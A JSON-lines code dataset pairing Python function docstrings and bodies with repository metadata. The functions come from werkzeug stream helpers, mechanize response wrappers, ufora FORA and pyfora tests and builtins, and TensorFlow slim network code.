{"docstring": "\"\"\"Works like :func:`make_line_iter` but accepts a separator\nwhich divides chunks.  If you want newline based processing\nyou shuold use :func:`make_limited_stream` instead as it\nsupports arbitrary newline markers.\n\n.. versionadded:: 0.8\n\n:param stream: the stream to iterate over.\n:param separator: the separator that divides chunks.\n:param limit: the limit in bytes for the stream.  (Usually\n              content length.  Not necessary if the `stream`\n              is a :class:`LimitedStream`.\n:param buffer_size: The optional buffer size.\n\"\"\"\n", "func_signal": "def make_chunk_iter(stream, separator, limit=None, buffer_size=10 * 1024):\n", "code": "stream = make_limited_stream(stream, limit)\n_read = stream.read\n_split = re.compile(r'(%s)' % re.escape(separator)).split\nbuffer = []\nwhile 1:\n    new_data = _read(buffer_size)\n    if not new_data:\n        break\n    chunks = _split(new_data)\n    new_buf = []\n    for item in chain(buffer, chunks):\n        if item == separator:\n            yield ''.join(new_buf)\n            new_buf = []\n        else:\n            new_buf.append(item)\n    buffer = new_buf\nif buffer:\n    yield ''.join(buffer)", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Exhaust the stream.  This consumes all the data left until the\nlimit is reached.\n\n:param chunk_size: the size for a chunk.  It will read the chunk\n                   until the stream is exhausted and throw away\n                   the results.\n\"\"\"\n", "func_signal": "def exhaust(self, chunk_size=1024 * 16):\n", "code": "to_read = self.limit - self._pos\nchunk = chunk_size\nwhile to_read > 0:\n    chunk = min(to_read, chunk)\n    self.read(chunk)\n    to_read -= chunk", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"What should happen if a disconnect is detected?  The return\nvalue of this function is returned from read functions in case\nthe client went away.  By default a\n:exc:`~werkzeug.exceptions.ClientDisconnected` exception is raised.\n\"\"\"\n", "func_signal": "def on_disconnect(self):\n", "code": "from exceptions import ClientDisconnected\nraise ClientDisconnected()", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Convenient factory for objects implementing response interface.\n\ndata: string containing response body data\nheaders: sequence of (name, value) pairs\nurl: URL of response\ncode: integer response code (e.g. 200)\nmsg: string response code message (e.g. \"OK\")\n\n\"\"\"\n", "func_signal": "def make_response(data, headers, url, code, msg):\n", "code": "mime_headers = make_headers(headers)\nr = closeable_response(StringIO(data), mime_headers, url, code, msg)\nreturn response_seek_wrapper(r)", "path": "NZBmegasearch\\mechanize\\_response.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Returns the next segment on the `PATH_INFO` or `None` if there\nis none.  Works like :func:`pop_path_info` without modifying the\nenvironment:\n\n>>> env = {'SCRIPT_NAME': '/foo', 'PATH_INFO': '/a/b'}\n>>> peek_path_info(env)\n'a'\n>>> peek_path_info(env)\n'a'\n\n.. versionadded:: 0.5\n\n:param environ: the WSGI environment that is checked.\n\"\"\"\n", "func_signal": "def peek_path_info(environ):\n", "code": "segments = environ.get('PATH_INFO', '').lstrip('/').split('/', 1)\nif segments:\n    return segments[0]", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Read `size` bytes or if size is not provided everything is read.\n\n:param size: the number of bytes read.\n\"\"\"\n", "func_signal": "def read(self, size=None):\n", "code": "if self._pos >= self.limit:\n    return self.on_exhausted()\nif size is None or size == -1:  # -1 is for consistence with file\n    size = self.limit\nto_read = min(self.limit - self._pos, size)\ntry:\n    read = self._read(to_read)\nexcept (IOError, ValueError):\n    return self.on_disconnect()\nif to_read and len(read) != to_read:\n    return self.on_disconnect()\nself._pos += len(read)\nreturn read", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "# There are three obvious options here:\n# 1. truncate\n# 2. read to end\n# 3. close socket, pickle state including read position, then open\n#    again on unpickle and use Range header\n# XXXX um, 4. refuse to pickle unless .close()d.  This is better,\n#  actually (\"errors should never pass silently\").  Pickling doesn't\n#  work anyway ATM, because of http://python.org/sf/1144636 so fix\n#  this later\n\n# 2 breaks pickle protocol, because one expects the original object\n# to be left unscathed by pickling.  3 is too complicated and\n# surprising (and too much work ;-) to happen in a sane __getstate__.\n# So we do 1.\n\n", "func_signal": "def __getstate__(self):\n", "code": "state = self.__dict__.copy()\nnew_wrapped = eofresponse(\n    self._url, self._headers, self.code, self.msg)\nstate[\"wrapped\"] = new_wrapped\nreturn state", "path": "NZBmegasearch\\mechanize\\_response.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Safely iterates line-based over an input stream.  If the input stream\nis not a :class:`LimitedStream` the `limit` parameter is mandatory.\n\nThis uses the stream's :meth:`~file.read` method internally as opposite\nto the :meth:`~file.readline` method that is unsafe and can only be used\nin violation of the WSGI specification.  The same problem applies to the\n`__iter__` function of the input stream which calls :meth:`~file.readline`\nwithout arguments.\n\nIf you need line-by-line processing it's strongly recommended to iterate\nover the input stream using this helper function.\n\n.. versionchanged:: 0.8\n   This function now ensures that the limit was reached.\n\n:param stream: the stream to iterate over.\n:param limit: the limit in bytes for the stream.  (Usually\n              content length.  Not necessary if the `stream`\n              is a :class:`LimitedStream`.\n:param buffer_size: The optional buffer size.\n\"\"\"\n", "func_signal": "def make_line_iter(stream, limit=None, buffer_size=10 * 1024):\n", "code": "stream = make_limited_stream(stream, limit)\ndef _iter_basic_lines():\n    _read = stream.read\n    buffer = []\n    while 1:\n        if len(buffer) > 1:\n            yield buffer.pop()\n            continue\n\n        # we reverse the chunks because popping from the last\n        # position of the list is O(1) and the number of chunks\n        # read will be quite large for binary files.\n        chunks = _read(buffer_size).splitlines(True)\n        chunks.reverse()\n\n        first_chunk = buffer and buffer[0] or ''\n        if chunks:\n            if first_chunk and first_chunk[-1] in '\\r\\n':\n                yield first_chunk\n                first_chunk = ''\n            first_chunk += chunks.pop()\n        else:\n            yield first_chunk\n            break\n\n        buffer = chunks\n\n        # in case the line is longer than the buffer size we\n        # can't yield yet.  This will only happen if the buffer\n        # is empty.\n        if not buffer and first_chunk[-1] not in '\\r\\n':\n            buffer = [first_chunk]\n        else:\n            yield first_chunk\n\n# This hackery is necessary to merge 'foo\\r' and '\\n' into one item\n# of 'foo\\r\\n' if we were unlucky and we hit a chunk boundary.\nprevious = ''\nfor item in _iter_basic_lines():\n    if item == '\\n' and previous[-1:] == '\\r':\n        previous += '\\n'\n        item = ''\n    if previous:\n        yield previous\n    previous = item\nif previous:\n    yield previous", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"This is called when the stream tries to read past the limit.\nThe return value of this function is returned from the reading\nfunction.\n\"\"\"\n", "func_signal": "def on_exhausted(self):\n", "code": "if self.silent:\n    return ''\nfrom exceptions import BadRequest\nraise BadRequest('input stream exhausted')", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "# this function exists because evaluation of len(file_.getvalue()) on every\n# .read() from seek_wrapper would be O(N**2) in number of .read()s\n", "func_signal": "def len_of_seekable(file_):\n", "code": "pos = file_.tell()\nfile_.seek(0, 2)  # to end\ntry:\n    return file_.tell()\nfinally:\n    file_.seek(pos)", "path": "NZBmegasearch\\mechanize\\_response.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "# sanitize the path for non unix systems\n", "func_signal": "def __call__(self, environ, start_response):\n", "code": "cleaned_path = environ.get('PATH_INFO', '').strip('/')\nfor sep in os.sep, os.altsep:\n    if sep and sep != '/':\n        cleaned_path = cleaned_path.replace(sep, '/')\npath = '/'.join([''] + [x for x in cleaned_path.split('/')\n                        if x and x != '..'])\nfile_loader = None\nfor search_path, loader in self.exports.iteritems():\n    if search_path == path:\n        real_filename, file_loader = loader(None)\n        if file_loader is not None:\n            break\n    if not search_path.endswith('/'):\n        search_path += '/'\n    if path.startswith(search_path):\n        real_filename, file_loader = loader(path[len(search_path):])\n        if file_loader is not None:\n            break\nif file_loader is None or not self.is_allowed(real_filename):\n    return self.app(environ, start_response)\n\nguessed_type = mimetypes.guess_type(real_filename)\nmime_type = guessed_type[0] or self.fallback_mimetype\nf, mtime, file_size = file_loader()\n\nheaders = [('Date', http_date())]\nif self.cache:\n    timeout = self.cache_timeout\n    etag = self.generate_etag(mtime, file_size, real_filename)\n    headers += [\n        ('Etag', '\"%s\"' % etag),\n        ('Cache-Control', 'max-age=%d, public' % timeout)\n    ]\n    if not is_resource_modified(environ, etag, last_modified=mtime):\n        f.close()\n        start_response('304 Not Modified', headers)\n        return []\n    headers.append(('Expires', http_date(time() + timeout)))\nelse:\n    headers.append(('Cache-Control', 'public'))\n\nheaders.extend((\n    ('Content-Type', mime_type),\n    ('Content-Length', str(file_size)),\n    ('Last-Modified', http_date(mtime))\n))\nstart_response('200 OK', headers)\nreturn wrap_file(environ, f)", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Return a copy of response that supports seekable response interface.\n\nAccepts responses from both mechanize and urllib2 handlers.\n\nCopes with both ordinary response instances and HTTPError instances (which\ncan't be simply wrapped due to the requirement of preserving the exception\nbase class).\n\"\"\"\n", "func_signal": "def seek_wrapped_response(response):\n", "code": "if not hasattr(response, \"seek\"):\n    wrapper_class = get_seek_wrapper_class(response)\n    response = wrapper_class(response)\nassert hasattr(response, \"get_data\")\nreturn response", "path": "NZBmegasearch\\mechanize\\_response.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "\"\"\"Makes a stream limited.\"\"\"\n", "func_signal": "def make_limited_stream(stream, limit):\n", "code": "if not isinstance(stream, LimitedStream):\n    if limit is None:\n        raise TypeError('stream not limited and no limit provided.')\n    stream = LimitedStream(stream, limit)\nreturn stream", "path": "NZBmegasearch\\werkzeug\\wsgi.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "# in order to wrap response objects that are also exceptions, we must\n# dynamically subclass the exception :-(((\n", "func_signal": "def get_seek_wrapper_class(response):\n", "code": "if (isinstance(response, urllib2.HTTPError) and\n    not hasattr(response, \"seek\")):\n    if response.__class__.__module__ == \"__builtin__\":\n        exc_class_name = response.__class__.__name__\n    else:\n        exc_class_name = \"%s.%s\" % (\n            response.__class__.__module__, response.__class__.__name__)\n\n    class httperror_seek_wrapper(response_seek_wrapper, response.__class__):\n        # this only derives from HTTPError in order to be a subclass --\n        # the HTTPError behaviour comes from delegation\n\n        _exc_class_name = exc_class_name\n\n        def __init__(self, wrapped):\n            response_seek_wrapper.__init__(self, wrapped)\n            # be compatible with undocumented HTTPError attributes :-(\n            self.hdrs = wrapped.info()\n            self.filename = wrapped.geturl()\n\n        def __repr__(self):\n            return (\n                \"<%s (%s instance) at %s \"\n                \"whose wrapped object = %r>\" % (\n                self.__class__.__name__, self._exc_class_name,\n                hex(abs(id(self))), self.wrapped)\n                )\n    wrapper_class = httperror_seek_wrapper\nelse:\n    wrapper_class = response_seek_wrapper\nreturn wrapper_class", "path": "NZBmegasearch\\mechanize\\_response.py", "repo_name": "pillone/usntssearch", "stars": 268, "license": "None", "language": "python", "size": 4558}
{"docstring": "#check that we can parse it\n", "func_signal": "def assertValidParse(self, stringForm, pyForm):\n", "code": "json = Json.Json.parse(stringForm)\n\n#check that the stringification parses to the same thing\nself.assertEqual(Json.Json.parse(str(json)), json)\n\n#verify that is has the right simple form\nself.assertEqual(json.toSimple(), pyForm)\n\n#verify that it can be constructed from the simple form\nself.assertEqual(Json.Json.fromSimple(json.toSimple()), json)", "path": "ufora\\core\\Json_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#walk a frame where we are holding a VectorHandle from within a paged vector\n", "func_signal": "def test_copyDataOutOfPages_VectorTrees(self):\n", "code": "self.copyDataOutOfPagesTest(\n            \"\"\"fun() {\n                let res = 0\n\n                //allocate one vector, but put it in twice, and pull it out twice\n                let (v1, v2) = (\n                    let v0 = [\"a\"].paged + [\"b\"] + [\"c\"].paged + [\"d\"] + [\"e\"].paged;\n                    let vPaged = [v0,v0].paged;\n                    (vPaged[0],vPaged[1])\n                    );\n\n                for ix in sequence(10000)\n                    res = res + ix\n\n                res + v1[0] + v2[0]\n                }\"\"\",\n            5000,\n            True\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "# NOTE here we are setting it automatically but we ought to require an\n# explicit setup here\n", "func_signal": "def evaluator():\n", "code": "global _evaluator\nif _evaluator is None:\n    assert False, \"Evaluator module not initialized. Please call Evaluator.initialize()\"\nreturn _evaluator", "path": "ufora\\FORA\\python\\Evaluator\\Evaluator.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#check that walking a frame with a few VectorHandles works\n", "func_signal": "def test_pageLargeVectorHandles_2(self):\n", "code": "self.pageLargeVectorHandlesTest(\n            \"\"\"fun() {\n                let res = 0\n                let v = [1,2,3];\n                let v2 = [v,v,v,v,v,v]\n\n                for ix in sequence(10000)\n                    res = res + ix\n\n                res + v2[0][0]\n                }\"\"\",\n            5000,\n            True\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#get a generator\n", "func_signal": "def __call__(self, f, sequence, start=Empty):\n", "code": "generator = sequence.__pyfora_generator__()\n\nif not generator.canSplit():\n    result = start\n    for val in generator:\n        if result is Empty:\n            result = val\n        else:\n            result = f(result, val)\n    return result\nelse:\n    def sum_(sumSubGenerator, depth):\n        if depth > 9 or not sumSubGenerator.canSplit():\n            result = Empty\n\n            if sumSubGenerator.isNestedGenerator():\n                #the outer generator might not be splittable anymore, but\n                #the inner ones might\n                for childGenerator in sumSubGenerator.childGenerators():\n                    if result is Empty:\n                        result = sum_(childGenerator, depth+1)\n                    else:\n                        result = f(result, sum_(childGenerator, depth+1))\n            else:\n                for val in sumSubGenerator:\n                    if result is Empty:\n                        result = val\n                    else:\n                        result = f(result, val)\n            return result\n        else:\n            split = sumSubGenerator.split()\n            left = sum_(split[0], depth+1)\n            right = sum_(split[1], depth+1)\n\n            if left is Empty:\n                return right\n            if right is Empty:\n                return left\n            return f(left, right)\n\n    result = sum_(generator, 0)\n\n    if result is Empty:\n        if start is Empty:\n            raise TypeError(\"reduce() of empty sequence with no initial value\")\n        return start\n\n    if start is Empty:\n        return result\n\n    return f(start, result)", "path": "packages\\python\\pyfora\\pure_modules\\pure___builtin__.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#walk a frame where we are holding a VectorHandle from within a paged vector\n", "func_signal": "def test_copyDataOutOfPages_4(self):\n", "code": "self.copyDataOutOfPagesTest(\n            \"\"\"fun() {\n                let res = 0\n\n                //allocate one vector, but put it in twice, and pull it out twice\n                let (v1, v2) = (\n                    let v0 = [1,2,3]\n                    let vPaged = [v0,v0].paged;\n                    (vPaged[0],vPaged[1])\n                    );\n\n                for ix in sequence(10000)\n                    res = res + ix\n\n                res + v1[0] + v2[0]\n                }\"\"\",\n            5000,\n            True\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "\"\"\"__without_stacktrace_augmentation\"\"\"\n\n", "func_signal": "def associativeReduce(self, initValSoFar, add, merge, empty):\n", "code": "return __inline_fora(\"\"\"\n    fun(@unnamed_args:(initValSoFar,\n                       start,\n                       increment,\n                       add,\n                       merge,\n                       empty,\n                       count),\n        *args)\n        {\n        __without_stacktrace_augmentation {\n            AssociativeReduce.associativeReduceIntegers(\n                initValSoFar,\n                fun(lst, ix) { \n                    __without_stacktrace_augmentation {\n                        add(lst, PyInt(start.@m + ix * increment.@m))\n                        }\n                    },\n                merge,\n                empty,\n                0,\n                count.@m\n                )\n            }\n        }\n    \"\"\")(initValSoFar, self.start, self.increment, add, merge, empty, self.count)", "path": "packages\\python\\pyfora\\pure_modules\\pure___builtin__.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#check that walking a frame with a few VectorHandles works\n", "func_signal": "def test_pageLargeVectorHandles(self):\n", "code": "self.pageLargeVectorHandlesTest(\n            \"\"\"fun() {\n                let res = 0\n                let v = [1,2,3];\n                v = v + v + v + v\n                v = v + v + v + v\n                v = v + v + v + v\n                v = v + v + v + v\n                v = v + v + v + v\n\n                for ix in sequence(10000)\n                    res = res + ix\n\n                res + v[0]\n                }\"\"\",\n            5000,\n            True\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#walk a frame where we are holding a VectorHandle from within a paged vector\n", "func_signal": "def test_copyDataOutOfPages_Strings(self):\n", "code": "self.copyDataOutOfPagesTest(\n            \"\"\"fun() {\n                let res = 0\n\n                //allocate one vector, but put it in twice, and pull it out twice\n                let (a, b) = (\n                    let v = [\"asdfasdfasdfasdfasdfasdfasdfasdfasdfasdf\",\n                        \"bsdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf\",\n                        \"casasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfdfasdfasdf\"].paged;\n                    (v[0],v[1])\n                    );\n\n                for ix in sequence(10000)\n                    res = res + ix\n\n                res + a[0] + b[0]\n                }\"\"\",\n            5000,\n            True\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "\"\"\"Swap out the evaluator. returns the old one, so it can be put back later\"\"\"\n", "func_signal": "def swapEvaluator(newEvaluator):\n", "code": "global _evaluator\noldEval = _evaluator\n_evaluator = newEvaluator\nreturn oldEval", "path": "ufora\\FORA\\python\\Evaluator\\Evaluator.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#walk a frame where we are holding a VectorHandle from within a paged vector\n", "func_signal": "def test_copyDataOutOfPages_5(self):\n", "code": "self.copyDataOutOfPagesTest(\n            \"\"\"fun() {\n                let res = 0\n\n                let v = [ [ [1.0].paged ] ].paged;\n\n                //now grab interior vector\n                let v2 = v[0]\n\n                for ix in sequence(10000)\n                    res = res + ix\n\n                res + size(v2)\n                }\"\"\",\n            5000,\n            True\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#walk a frame where we are holding a VectorHandle from within a paged vector\n", "func_signal": "def test_copyDataOutOfPages_3(self):\n", "code": "self.copyDataOutOfPagesTest(\n            \"\"\"fun() {\n                let res = 0\n\n                //allocate a vector that's a reference into a paged Vector\n                let v = [[1,2,3]].paged[0];\n\n                for ix in sequence(10000)\n                    res = res + ix\n\n                res + v[0]\n                }\"\"\",\n            5000,\n            True\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#check that walking a frame with a few VectorHandles works\n", "func_signal": "def test_pageLargeVectorHandles_5(self):\n", "code": "self.pageLargeVectorHandlesTest(\n            \"\"\"fun() {\n                let res = 0\n                let v = [1,2,3,4]\n                v = v + v + v + v\n                v = v + v + v + v\n                v = v + v + v + v\n                v = v + v + v + v\n\n                let f = fun(vec) {\n                    let res = 0;\n                    for ix in sequence(1, size(vec) - 1)\n                        res = res + f(vec[,ix]) + f(vec[ix,])\n                    res\n                    }\n\n                f(v)\n                }\"\"\",\n            10000,\n            True\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "# assert we're getting a character of length 1\n", "func_signal": "def __call__(self, character):\n", "code": "if len(character) != 1:\n    raise TypeError(\"ord() expected a character\")\n\nreturn __inline_fora(\n    \"\"\"fun(@unnamed_args:(s), *args) { PyInt(Int64(s.@m[0])) }\"\"\"\n    )(character)", "path": "packages\\python\\pyfora\\pure_modules\\pure___builtin__.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#check that walking a frame with a VectorHandle appears to work\n", "func_signal": "def test_copyDataOutOfPages_2(self):\n", "code": "self.copyDataOutOfPagesTest(\n            \"\"\"fun() {\n                let res = 0\n                let v = [1,2,3].paged;\n\n                for ix in sequence(10000)\n                    res = res + ix\n\n                res + v[0]\n                }\"\"\",\n            5000,\n            False\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "# verified against old fora implementation\n\n", "func_signal": "def test_gradient_boosting_regression_1(self):\n", "code": "def f():\n    x, y = generateRegressionData(0.1, 10)\n\n    builder = GradientBoostedRegressorBuilder(1, 1, 1.0)\n    fit = builder.fit(x, y)\n    return fit.additiveRegressionTree.trees\n\n\ntrees = self.evaluateWithExecutor(f)\n\nself.assertEqual(len(trees), 2)\n\nself.assertEqual(len(trees[0].rules), 1)\nnode_0_0 = trees[0].rules[0]\nself.assertIsInstance(node_0_0, RegressionTree.RegressionLeafRule)\nself.assertTrue(numpy.isclose(node_0_0.leafValue, 4.98992443325))\n\nself.assertEqual(len(trees[1].rules), 3)\nnode_1_0 = trees[1].rules[0]\nself.assertEqual(node_1_0.jumpIfLess, 1)\nself.assertEqual(node_1_0.jumpIfHigher, 2)\nself.assertTrue(\n    numpy.isclose(node_1_0.leafValue, -1.99858787976183e-16)\n    )\nself.assertEqual(node_1_0.rule.dimension, 8)\n\nself.assertTrue(\n    numpy.isclose(node_1_0.rule.splitPoint, 3.00115009354123),\n    (node_1_0.rule.splitPoint, 3.00115009354123)\n    )\nself.assertTrue(\n    numpy.isclose(\n        node_1_0.rule.impurityImprovement,\n        0.00093093285723711\n        )\n    )\nself.assertEqual(node_1_0.rule.numSamples, 1191)\n\nnode_1_1 = trees[1].rules[1]\nself.assertIsInstance(\n    node_1_1,\n    RegressionTree.RegressionLeafRule\n    )\nself.assertTrue(\n    numpy.isclose(node_1_1.leafValue, 0.0373292355137323)\n    )\n\nnode_1_2 = trees[1].rules[2]\nself.assertIsInstance(\n    node_1_2,\n    RegressionTree.RegressionLeafRule\n    )\nself.assertTrue(\n    numpy.isclose(node_1_2.leafValue, -0.0249384388516114)\n    )", "path": "ufora\\FORA\\python\\PurePython\\GradientBoostingTests.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#check that walking a frame with a few VectorHandles works\n", "func_signal": "def test_pageLargeVectorHandles_3(self):\n", "code": "self.pageLargeVectorHandlesTest(\n            \"\"\"fun() {\n                let res = 0\n                let v = [[x for x in sequence(ix)] for ix in sequence(1000)]\n\n                v.sum(fun(x){x.sum()})\n                }\"\"\",\n            300000,\n            True\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "\"\"\"call 'f' after timeout seconds\"\"\"\n", "func_signal": "def triggerAfter(f, timeout):\n", "code": "def threadFun():\n    time.sleep(timeout)\n    f()\nthreading.Thread(target = threadFun).start()", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "# verified against old fora implementation\n\n", "func_signal": "def test_gradient_boosting_classification_1(self):\n", "code": "def f():\n    x, y = generateClassificationData(0.1, 10)\n\n    builder = GradientBoostedClassifierBuilder(1, 1, 1.0)\n    fit = builder.fit(x, y)\n    return fit.additiveRegressionTree.trees\n\n\ntrees = self.evaluateWithExecutor(f)\n\nself.assertEqual(len(trees), 2)\n\nself.assertEqual(len(trees[0].rules), 1)\nnode_0_0 = trees[0].rules[0]\nself.assertIsInstance(node_0_0, RegressionTree.RegressionLeafRule)\nself.assertTrue(numpy.isclose(node_0_0.leafValue, 0.0))\n\nself.assertEqual(len(trees[1].rules), 3)\nnode_1_0 = trees[1].rules[0]\nself.assertEqual(node_1_0.jumpIfLess, 1)\nself.assertEqual(node_1_0.jumpIfHigher, 2)\nself.assertTrue(\n    numpy.isclose(node_1_0.leafValue, -0.09151973131822)\n    )\nself.assertEqual(node_1_0.rule.dimension, 8)\nself.assertTrue(\n    numpy.isclose(node_1_0.rule.splitPoint, 8.00024176403741),\n    (node_1_0.rule.splitPoint, 3.00115009354123)\n    )\nself.assertTrue(\n    numpy.isclose(\n        node_1_0.rule.impurityImprovement,\n        2.80266701735421e-05\n        )\n    )\n\nnode_1_1 = trees[1].rules[1]\nself.assertIsInstance(\n    node_1_1,\n    RegressionTree.RegressionLeafRule\n    )\nself.assertTrue(\n    numpy.isclose(node_1_1.leafValue, -0.0932835820895522)\n    )\n\nnode_1_2 = trees[1].rules[2]\nself.assertIsInstance(\n    node_1_2,\n    RegressionTree.RegressionLeafRule\n    )\nself.assertTrue(\n    numpy.isclose(node_1_2.leafValue, -0.0756302521008403)\n    )", "path": "ufora\\FORA\\python\\PurePython\\GradientBoostingTests.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "#verify that just walking the stackframes doesn't segfault us\n", "func_signal": "def test_copyDataOutOfPages_1(self):\n", "code": "self.copyDataOutOfPagesTest(\n            \"\"\"fun() {\n                let res = 0\n                for ix in sequence(10000)\n                    res = res + ix\n                res\n                }\"\"\",\n            5000,\n            False\n            )", "path": "ufora\\FORA\\Core\\ExecutionContext_test.py", "repo_name": "ufora/ufora", "stars": 495, "license": "apache-2.0", "language": "python", "size": 25378}
{"docstring": "# Check graph construction for a number of image size/depths and batch\n# sizes.\n", "func_signal": "def test_discriminator_graph(self):\n", "code": "for i, batch_size in zip(xrange(1, 6), xrange(3, 8)):\n  tf.reset_default_graph()\n  img_w = 2 ** i\n  image = tf.random_uniform([batch_size, img_w, img_w, 3], -1, 1)\n  output, end_points = dcgan.discriminator(\n      image,\n      depth=32)\n\n  self.assertAllEqual([batch_size, 1], output.get_shape().as_list())\n\n  expected_names = ['conv%i' % j for j in xrange(1, i+1)] + ['logits']\n  self.assertSetEqual(set(expected_names), set(end_points.keys()))\n\n  # Check layer depths.\n  for j in range(1, i+1):\n    layer = end_points['conv%i' % j]\n    self.assertEqual(32 * 2**(j-1), layer.get_shape().as_list()[-1])", "path": "nets\\dcgan_test.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Takes in an operations and parses it to the correct sep operation.\"\"\"\n", "func_signal": "def _stacked_separable_conv(net, stride, operation, filter_size):\n", "code": "num_layers, kernel_size = _operation_to_info(operation)\nfor layer_num in range(num_layers - 1):\n  net = tf.nn.relu(net)\n  net = slim.separable_conv2d(\n      net,\n      filter_size,\n      kernel_size,\n      depth_multiplier=1,\n      scope='separable_{0}x{0}_{1}'.format(kernel_size, layer_num + 1),\n      stride=stride)\n  net = slim.batch_norm(\n      net, scope='bn_sep_{0}x{0}_{1}'.format(kernel_size, layer_num + 1))\n  stride = 1\nnet = tf.nn.relu(net)\nnet = slim.separable_conv2d(\n    net,\n    filter_size,\n    kernel_size,\n    depth_multiplier=1,\n    scope='separable_{0}x{0}_{1}'.format(kernel_size, num_layers),\n    stride=stride)\nnet = slim.batch_norm(\n    net, scope='bn_sep_{0}x{0}_{1}'.format(kernel_size, num_layers))\nreturn net", "path": "nets\\nasnet\\nasnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
{"docstring": "\"\"\"Takes in the operation string and returns the pooling kernel shape.\"\"\"\n", "func_signal": "def _operation_to_pooling_shape(operation):\n", "code": "splitted_operation = operation.split('_')\nshape = splitted_operation[-1]\nassert 'x' in shape\nfilter_height, filter_width = shape.split('x')\nassert filter_height == filter_width\nreturn int(filter_height)", "path": "nets\\nasnet\\nasnet_utils.py", "repo_name": "cameronfabbri/Compute-Features", "stars": 312, "license": "None", "language": "python", "size": 152}
